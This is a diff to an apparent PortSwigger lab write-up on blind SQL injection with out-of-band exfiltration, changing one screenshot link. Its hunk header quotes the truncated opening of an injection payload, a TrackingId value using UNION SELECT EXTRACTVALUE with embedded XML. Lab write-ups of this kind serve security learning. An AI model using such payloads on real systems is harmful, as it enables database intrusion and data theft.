@@ -85,7 +85,7 @@ TrackingId=' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UT
 
 The application initially appeared to be a normal e-commerce website containing the **Lifestyle** category filter.
 
-![Main Website](screenshots/oast-data-exfiltration-1.png)
+![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Out-of-Band%20Data%20Exfiltration/screenshots/lab13.png?raw=true)
 
 **Caption:** Initial application interface containing the Lifestyle category filter.
 
